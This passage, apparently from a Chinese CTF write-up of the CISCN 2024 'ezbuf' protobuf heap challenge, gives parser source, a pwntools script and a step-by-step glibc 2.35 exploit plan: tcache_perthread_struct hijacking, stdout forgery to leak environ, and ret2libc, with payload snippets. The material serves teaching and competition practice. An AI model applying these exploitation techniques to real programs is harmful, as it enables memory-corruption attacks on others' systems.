required_fields_bitmap_len);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generated code always defines &quot;message_init&quot;. However, we provide a</span><br><span class="hljs-comment"> * fallback for (1) users of old protobuf-c generated-code that do not</span><br><span class="hljs-comment"> * provide the function, and (2) descriptors constructed from some other</span><br><span class="hljs-comment"> * source (most likely, direct construction from the .proto file).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (desc-&gt;message_init != <span class="hljs-literal">NULL</span>)<br>protobuf_c_message_init(desc, rv);<br><span class="hljs-keyword">else</span><br>message_init_generic(desc, rv);<br><br><span class="hljs-keyword">while</span> (rem &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">uint32_t</span> tag;<br><span class="hljs-type">uint8_t</span> wire_type;<br><span class="hljs-type">size_t</span> used = parse_tag_and_wiretype(rem, at, &amp;tag, &amp;wire_type);<br><span class="hljs-type">const</span> ProtobufCFieldDescriptor *field;<br>ScannedMember tmp;<br><br><span class="hljs-keyword">if</span> (used == <span class="hljs-number">0</span>) &#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;error parsing tag/wiretype at offset %u&quot;</span>,<br>(<span class="hljs-type">unsigned</span>) (at - data));<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * \todo Consider optimizing for field[1].id == tag, if field[1]</span><br><span class="hljs-comment"> * exists!</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (last_field == <span class="hljs-literal">NULL</span> || last_field-&gt;id != tag) &#123;<br><span class="hljs-comment">/* lookup field */</span><br><span class="hljs-type">int</span> field_index =<br>    int_range_lookup(desc-&gt;n_field_ranges,<br>     desc-&gt;field_ranges,<br>     tag);<br><span class="hljs-keyword">if</span> (field_index &lt; <span class="hljs-number">0</span>) &#123;<br>field = <span class="hljs-literal">NULL</span>;<br>n_unknown++;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>field = desc-&gt;fields + field_index;<br>last_field = field;<br>last_field_index = field_index;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>field = last_field;<br>&#125;<br><br><span class="hljs-keyword">if</span> (field != <span class="hljs-literal">NULL</span> &amp;&amp; field-&gt;label == PROTOBUF_C_LABEL_REQUIRED)<br>REQUIRED_FIELD_BITMAP_SET(last_field_index);<br><br>at += used;<br>rem -= used;<br>tmp.tag = tag;<br>tmp.wire_type = wire_type;<br>tmp.field = field;<br>tmp.data = at;<br>tmp.length_prefix_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">switch</span> (wire_type) &#123;<br><span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_VARINT: &#123;<br><span class="hljs-type">unsigned</span> max_len = rem &lt; <span class="hljs-number">10</span> ? rem : <span class="hljs-number">10</span>;<br><span class="hljs-type">unsigned</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; max_len; i++)<br><span class="hljs-keyword">if</span> ((at[i] &amp; <span class="hljs-number">0x80</span>) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (i == max_len) &#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;unterminated varint at offset %u&quot;</span>,<br>(<span class="hljs-type">unsigned</span>) (at - data));<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>tmp.len = i + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_64BIT:<br><span class="hljs-keyword">if</span> (rem &lt; <span class="hljs-number">8</span>) &#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;too short after 64bit wiretype at offset %u&quot;</span>,<br>(<span class="hljs-type">unsigned</span>) (at - data));<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>tmp.len = <span class="hljs-number">8</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_LENGTH_PREFIXED: &#123;<br><span class="hljs-type">size_t</span> pref_len;<br><br>tmp.len = scan_length_prefixed_data(rem, at, &amp;pref_len);<br><span class="hljs-keyword">if</span> (tmp.len == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* <span class="hljs-doctag">NOTE:</span> scan_length_prefixed_data calls UNPACK_ERROR */</span><br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>tmp.length_prefix_len = pref_len;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_32BIT:<br><span class="hljs-keyword">if</span> (rem &lt; <span class="hljs-number">4</span>) &#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;too short after 32bit wiretype at offset %u&quot;</span>,<br>      (<span class="hljs-type">unsigned</span>) (at - data));<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>tmp.len = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;unsupported tag %u at offset %u&quot;</span>,<br>wire_type, (<span class="hljs-type">unsigned</span>) (at - data));<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_slab_index == (<span class="hljs-number">1UL</span> &lt;&lt;<br>(which_slab + FIRST_SCANNED_MEMBER_SLAB_SIZE_LOG2)))<br>&#123;<br><span class="hljs-type">size_t</span> size;<br><br>in_slab_index = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (which_slab == MAX_SCANNED_MEMBER_SLAB) &#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;too many fields&quot;</span>);<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>which_slab++;<br>size = <span class="hljs-keyword">sizeof</span>(ScannedMember)<br>&lt;&lt; (which_slab + FIRST_SCANNED_MEMBER_SLAB_SIZE_LOG2);<br>scanned_member_slabs[which_slab] = do_alloc(allocator, size);<br><span class="hljs-keyword">if</span> (scanned_member_slabs[which_slab] == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>scanned_member_slabs[which_slab][in_slab_index++] = tmp;<br><br><span class="hljs-keyword">if</span> (field != <span class="hljs-literal">NULL</span> &amp;&amp; field-&gt;label == PROTOBUF_C_LABEL_REPEATED) &#123;<br><span class="hljs-type">size_t</span> *n = STRUCT_MEMBER_PTR(<span class="hljs-type">size_t</span>, rv,<br>      field-&gt;quantifier_offset);<br><span class="hljs-keyword">if</span> (wire_type == PROTOBUF_C_WIRE_TYPE_LENGTH_PREFIXED &amp;&amp;<br>    (<span class="hljs-number">0</span> != (field-&gt;flags &amp; PROTOBUF_C_FIELD_FLAG_PACKED) ||<br>     is_packable_type(field-&gt;type)))<br>&#123;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-keyword">if</span> (!count_packed_elements(field-&gt;type,<br>   tmp.len -<br>   tmp.length_prefix_len,<br>   tmp.data +<br>   tmp.length_prefix_len,<br>   &amp;count))<br>&#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;counting packed elements&quot;</span>);<br><span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>&#125;<br>*n += count;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>*n += <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br>at += tmp.len;<br>rem -= tmp.len;<br>&#125;<br><br><span class="hljs-comment">/* allocate space for repeated fields, also check that all required fields have been set */</span><br><span class="hljs-keyword">for</span> (f = <span class="hljs-number">0</span>; f &lt; desc-&gt;n_fields; f++) &#123;<br><span class="hljs-type">const</span> ProtobufCFieldDescriptor *field = desc-&gt;fields + f;<br><span class="hljs-keyword">if</span> (field == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (field-&gt;label == PROTOBUF_C_LABEL_REPEATED) &#123;<br><span class="hljs-type">size_t</span> siz =<br>    sizeof_elt_in_repeated_array(field-&gt;type);<br><span class="hljs-type">size_t</span> *n_ptr =<br>    STRUCT_MEMBER_PTR(<span class="hljs-type">size_t</span>, rv,<br>      field-&gt;quantifier_offset);<br><span class="hljs-keyword">if</span> (*n_ptr != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">unsigned</span> n = *n_ptr;<br><span class="hljs-type">void</span> *a;<br>*n_ptr = <span class="hljs-number">0</span>;<br>assert(rv-&gt;descriptor != <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLEAR_REMAINING_N_PTRS()                                              \</span><br><span class="hljs-meta">              for(f++;f <span class="hljs-string">&lt; desc-&gt;</span>n_fields; f++)                                \</span><br><span class="hljs-meta">                &#123;                                                             \</span><br><span class="hljs-meta">                  field = desc-&gt;fields + f;                                   \</span><br><span class="hljs-meta">                  <span class="hljs-keyword">if</span> (field-&gt;label == PROTOBUF_C_LABEL_REPEATED)              \</span><br><span class="hljs-meta">                    STRUCT_MEMBER (size_t, rv, field-&gt;quantifier_offset) = 0; \</span><br><span class="hljs-meta">                &#125;</span><br>a = do_alloc(allocator, siz * n);<br><span class="hljs-keyword">if</span> (!a) &#123;<br>CLEAR_REMAINING_N_PTRS();<br><span class="hljs-keyword">goto</span> error_cleanup;<br>&#125;<br>STRUCT_MEMBER(<span class="hljs-type">void</span> *, rv, field-&gt;offset) = a;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (field-&gt;label == PROTOBUF_C_LABEL_REQUIRED) &#123;<br><span class="hljs-keyword">if</span> (field-&gt;default_value == <span class="hljs-literal">NULL</span> &amp;&amp;<br>    !REQUIRED_FIELD_BITMAP_IS_SET(f))<br>&#123;<br>CLEAR_REMAINING_N_PTRS();<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;message &#x27;%s&#x27;: missing required field &#x27;%s&#x27;&quot;</span>,<br>desc-&gt;name, field-&gt;name);<br><span class="hljs-keyword">goto</span> error_cleanup;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> CLEAR_REMAINING_N_PTRS</span><br><br><span class="hljs-comment">/* allocate space for unknown fields */</span><br><span class="hljs-keyword">if</span> (n_unknown) &#123;<br>rv-&gt;unknown_fields = do_alloc(allocator,<br>      n_unknown * <span class="hljs-keyword">sizeof</span>(ProtobufCMessageUnknownField));<br><span class="hljs-keyword">if</span> (rv-&gt;unknown_fields == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> error_cleanup;<br>&#125;<br><br><span class="hljs-comment">/* do real parsing */</span><br><span class="hljs-keyword">for</span> (i_slab = <span class="hljs-number">0</span>; i_slab &lt;= which_slab; i_slab++) &#123;<br><span class="hljs-type">unsigned</span> max = (i_slab == which_slab) ?<br>in_slab_index : (<span class="hljs-number">1UL</span> &lt;&lt; (i_slab + <span class="hljs-number">4</span>));<br>ScannedMember *slab = scanned_member_slabs[i_slab];<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; max; j++) &#123;<br><span class="hljs-keyword">if</span> (!parse_member(slab + j, rv, allocator)) &#123;<br>PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;error parsing member %s of %s&quot;</span>,<br>slab-&gt;field ? slab-&gt;field-&gt;name : <span class="hljs-string">&quot;*unknown-field*&quot;</span>,<br>desc-&gt;name);<br><span class="hljs-keyword">goto</span> error_cleanup;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* cleanup */</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= which_slab; j++)<br>do_free(allocator, scanned_member_slabs[j]);<br><span class="hljs-keyword">if</span> (required_fields_bitmap_alloced)<br>do_free(allocator, required_fields_bitmap);<br><span class="hljs-keyword">return</span> rv;<br><br>error_cleanup:<br>protobuf_c_message_free_unpacked(rv, allocator);<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= which_slab; j++)<br>do_free(allocator, scanned_member_slabs[j]);<br><span class="hljs-keyword">if</span> (required_fields_bitmap_alloced)<br>do_free(allocator, required_fields_bitmap);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>error_cleanup_during_scan:<br>do_free(allocator, rv);<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= which_slab; j++)<br>do_free(allocator, scanned_member_slabs[j]);<br><span class="hljs-keyword">if</span> (required_fields_bitmap_alloced)<br>do_free(allocator, required_fields_bitmap);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>首先编写交互逻辑，主要是将create函数和show函数用python实现出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> heybro_pb2<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">1</span><br>    data.whatcon = content<br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">0</span><br>    data.whatsthis = <span class="hljs-number">0</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">2</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">3</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_nothing</span>(<span class="hljs-params">content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">0</span><br>    data.whatcon = content<br>    data.whatidx = <span class="hljs-number">1</span><br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)    <br><br>gdb.attach(p)<br>create(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>编写这样的程序，调试运行。<br>第一张是解包函数运行后的堆块变化<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-1.png"></p><p>第二张是menu函数运行后的堆块变化<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-2.png"></p><p>查看不同堆块的数据<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-hexdump.png"></p><p>最终运行结果<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak.png"></p><p>从这里可以看出，解包过程中会申请两个chunk<br>第一个chunk的大小由ProtobufCMessageDescriptor的sizeof_message成员决定，本题固定为0x48，申请后chunk大小为0x50，符合分析结果<br>第二个chunk的大小由content的大小决定，我们只输入了8个字节，所以会申请最小的chunk，也就是0x20大小的chunk</p><p>第二张图片显示的堆块变化是menu函数申请的0x30大小的堆块，用来存放content，并将unsortedbin的bk指针一起copy了<br>可以得知输入8字节数据后可以泄露出一个unsortedbin的bk指针，调试获取偏移即可计算libc基址</p><p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak-2.png"></p><p>得到偏移 2206944(0x21ace0)</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>通过泄露的unsortedbin的bk指针调试获取偏移，计算libc基址</li><li>将堆块释放进入tcache，利用PROTECT_PTR机制获取堆上地址(缺少最后12bit)，调试获取与heap基址的偏移，计算heap基址</li><li>利用create函数，不断创建0x40的堆块，最后释放，填满tcache</li><li>利用double free构造fastbin循环链表</li><li>将所有0x40大小的tcache全部申请出来</li><li>调试获取循环链表中第一个链表的地址与heap_base的差值(为了生成PROTECT_PTR保护后的地址)<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak-3.png"></li><li>利用PROTECT_PTR公式，填充相应的地址<code>p64((heap_base + 0xf0)^((heap_base + 0x004e40)&gt;&gt;12))</code><br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-alloc.png"></li><li>在heap_base + 0xf0处(即0xf8大小的tcache块的entries指针处，详细计算过程见<a href="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/#tcache_perthread_struct">tcache_perthread_struct</a>)，填上heap_base+0x10地址，之后申请0xe0大小的堆块后就会在heap_base+0x10处取堆块，由于tcache指向的是用户内存，所以它实际上申请到了tcache_perthread_struct</li><li>之后便可以更改<code>tcache_perthread_struct</code>了，可以实现tcache的任意分配，分配到<code>stdout</code>更改<code>write_ptr</code>和<code>write_end</code>指针泄露<code>environ</code>，调试<code>environ</code>与栈的偏移计算出栈地址，然后在利用<code>tcache_perthread_struct</code>分配到栈上进行ret2libc</li></ol><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><p>tcache_perthread_struct在glibc-2.30有个改动，改动了结构体中counts成员的数据类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><br><span class="hljs-comment">// glibc-2.30之前</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-comment">//glibc-2.30及以后</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure><p>根据这个结构体，可以计算出0xf0大小的tcache块位于堆基址的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">word_bytes = context.word_size // <span class="hljs-number">8</span> <span class="hljs-comment"># i386-&gt;word_size=32  amd64-&gt;word_size=64</span><br>target = <span class="hljs-number">0xf0</span><br><br><span class="hljs-comment"># glibc-2.30之前</span><br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">0x40</span> + (target-<span class="hljs-number">0x20</span>)//<span class="hljs-number">0x10</span> * word_bytes<br><br><span class="hljs-comment"># glibc-2.30及以后</span><br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">0x80</span> + (target-<span class="hljs-number">0x20</span>)//<span class="hljs-number">0x10</span> * word_bytes<br></code></pre></td></tr></table></figure><p>本题是glibc-2.35，利用第二个公式，计算出offset为0xf8<br>我们将<code>heap_base + 0xf8</code>这里的值覆盖为<code>heap_base + 0x10</code><br>当我们申请0xe0大小的空间时(利用解包过程中会申请与content大小相同的空间)，便会申请到<code>heap_base+0x10</code>开始的写权限<br>即可劫持<code>tcache_perthread_struct</code>，实现堆任意分配</p><p>看看我们改之后的<code>tcache_perthread_struct</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 伪造counts</span><br>payload  = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p16(<span class="hljs-number">1</span>)<br>payload  = payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 伪造entrtes</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout)+p64(stdout)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heap_base+<span class="hljs-number">0x10</span>)<br>payload  = payload.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们将0x40,0x50,0xb0的counts修改为1<br>并将对应的0x40,0x50大小的entries改为stdout结构体的位置<br>将对应0xb0大小的堆块改为<code>heap_base+0x10</code>，以便继续控制<code>tcache_perthread_struct</code><br>最后调整为0xe0，在解包过程中，会申请0xf0大小的chunk，也就是<code>tcache_perthread_struct</code>，然后将content填进去，也就实现了篡改<code>tcache_perthread_struct</code></p><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>我们将stdout修改成这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(<span class="hljs-number">0xFBAD1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(environ)+p64(environ+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>0xFBAD1800是_IO_MAGIC，由libc定义，大部分都是这个值<br>我们将_IO_write_base修改为environ，将_IO_write_ptr改为environ+8<br>之后便会泄露environ的值</p><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>environ是个由libc定义的全局变量，定义为<code>char **environ</code>，用于存放程序的环境变量<br>而它存放的指针通常是栈上的，所以可以利用它来泄露栈上的值</p><h3 